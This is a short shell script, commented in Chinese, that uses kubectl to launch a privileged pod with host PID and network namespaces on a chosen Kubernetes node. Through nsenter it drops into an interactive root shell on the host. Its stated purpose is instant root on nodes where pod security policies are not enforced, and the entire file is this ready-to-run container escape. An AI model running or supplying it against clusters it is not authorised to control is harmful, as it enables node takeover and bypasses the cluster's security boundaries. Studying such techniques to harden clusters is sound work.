#!/bin/sh
####
# 未开启psp,获得对Kubernetes节点的即时root访问权限.
###

node=${1}
if [ -n "${node}" ]; then
  nodeSelector='"nodeSelector": { "kubernetes.io/hostname": "'${node:?}'" },'
else
  nodeSelector=""
fi
set -x
kubectl run ${USER+${USER}-}sudo --restart=Never -it \
  --image overriden --overrides '
{
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    '"${nodeSelector?}"'
    "containers": [
      {
        "name": "busybox",
        "image": "alpine:3.7",
        "command": ["nsenter", "--mount=/proc/1/ns/mnt", "--", "sh", "-c", "hostname sudo--$(cat /etc/hostname); exec /bin/bash"],
        "stdin": true,
        "tty": true,
        "resources": {"requests": {"cpu": "10m"}},
        "securityContext": {
          "privileged": true
        }
      }
    ]
  }
}' --rm --attach
